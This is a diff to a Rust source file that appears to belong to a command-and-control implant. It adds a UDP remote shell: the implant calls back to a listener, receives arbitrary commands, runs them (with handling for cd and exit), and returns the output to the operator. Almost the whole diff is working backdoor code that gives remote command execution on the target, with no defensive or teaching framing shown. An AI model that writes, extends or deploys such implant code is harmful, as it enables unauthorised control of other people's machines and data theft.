@@ -10,6 +10,7 @@ use std::format;
 use std::sync::{Arc, Mutex};
 use std::time::Duration;
 use std::thread;
+use std::path::Path;
 
 /*****************************/
 /*     USEFUL STRUCTURES     */
@@ -251,25 +252,62 @@ pub fn decode_http(){
 /***************************/
 
 // creates a shell on the target
-pub fn shell() {
-    if let Ok(command) = Command::new("/bin/sh").output(){
-        println!("{}", String::from_utf8_lossy(&command.stdout));
+pub fn shell(sock: &mut UdpSocket) {
+    loop {
+        // checks if shell is being terminated
+        let mut cc = [0; 1];
+        let (bytes, src) = match sock.recv_from(&mut cc) {
+            Ok((b, s)) => (b, s),
+            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+        };
+        if cc[0] == 69 {
+            break;
+        }
+        // Otherwise shell it up!
+        let mut buffer = [0;2048];
+        let (bytes, src) = match sock.recv_from(&mut buffer) {
+            Ok((b, s)) => (b, s),
+            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
+        };
+        if bytes != 0 {
+            let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
+            let cmd_out = format!("{}{}", execute_cmd(cmd), "\n>> ");
+            if cmd_out.ne(">> ") {
+                sock.send_to(cmd_out.as_bytes(), src);
+            }
+            else {
+                break;
+            }
+        }
     }
 }
 
 // executes a single arbitrary command
 pub fn execute_cmd(s: String) -> String {
-    if s.contains(' ') {
-        let mut split = s.split_whitespace();
-        let head = split.next().unwrap();
-        let tail: Vec<&str> = split.collect();
-        let cmd = Command::new(head).args(tail).output().unwrap();
-        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
+    //if s.contains(' ') {
+    let mut split = s.trim().split_whitespace();
+    let head = split.next().unwrap();
+    let tail = split;
+    match head {
+        "cd" => {
+            let new_dir = tail.peekable().peek().map_or("/", |x| *x);
+            let root = Path::new(new_dir);
+            match std::env::set_current_dir(&root) {
+                Err(e) => return format!("{}", e),
+                Ok(k) => todo!(),
+            }
+        },
+        "exit" => return String::new(),
+        head => {
+            let cmd = Command::new(head).args(tail).output().unwrap();
+            return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
+        },
     }
+    /*}
     else {
         let cmd = Command::new(s).output().unwrap();
         return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
-    }
+    }*/
 }
 
 // main method for implants
@@ -293,6 +331,7 @@ fn imp_udp(lsn_addr: SocketAddr) {
     let address = SocketAddr::from(([127, 0, 0, 1], 2973));
     // let address = get_system_addr();
     let mut sock = UdpSocket::bind(address).unwrap();
+    sock.set_read_timeout(Some(Duration::from_millis(100))).expect("set_read_timeout failed");
 
     // try to connect back to listener
     sock.send_to("order up".as_bytes(), lsn_addr);
@@ -315,8 +354,6 @@ fn imp_udp(lsn_addr: SocketAddr) {
             Ok((b, s)) => (b, s),
             Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
         };
-
-        let mut shell_mode: bool = false;
         if bytes != 0 {
             match cc[0] {
                 // execute single line cmd
@@ -331,9 +368,7 @@ fn imp_udp(lsn_addr: SocketAddr) {
                     }
                 },
                 // begin shell mode
-                2 => shell_mode = true,
-                // stop shell mode
-                69 => shell_mode = false,
+                2 => shell(&mut sock),
                 _u8 => todo!(),
             }
         }
